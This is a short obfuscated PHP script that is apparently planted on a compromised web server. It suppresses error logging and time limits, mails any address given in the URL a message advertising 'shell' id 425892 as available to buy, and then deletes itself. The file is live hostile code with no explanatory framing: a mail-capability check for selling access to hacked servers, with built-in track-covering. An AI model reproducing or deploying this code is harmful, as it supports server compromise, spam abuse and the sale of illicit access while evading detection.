<?php  goto gkxBA; rMYTg: @ini_set("max_execution_time", 0); goto IC_4Q; gkxBA: @ini_set("error_log", NULL); goto Pk2Zb; howCb: if (!empty($_GET["to"])) { goto D5TDG; D5TDG: $to = $_GET["to"]; goto Gqmca; Gqmca: $subject = "Shell Testing #425892"; goto nLoGc; Px9ew: if (@mail($to, $subject, $message, $headers)) { echo "##SENT##"; } else { echo "##NOTSENT##"; } goto WhuG6; nLoGc: $message = 'This shell with id: 425892 is delivering , you can buy it now.'; goto ZTP9l; ZTP9l: $headers = 'From: Testing #425892 <support@liuqasd.xyz>' . "\r\n" . 'Reply-To: support@liuqasd.xyz' . "\r\n" . 'X-Mailer: PHP/' . phpversion(); goto Px9ew; WhuG6: } goto x6ZrQ; IC_4Q: @set_time_limit(0); goto howCb; Pk2Zb: @ini_set("log_errors", 0); goto rMYTg; x6ZrQ: unlink(basename(__FILE__));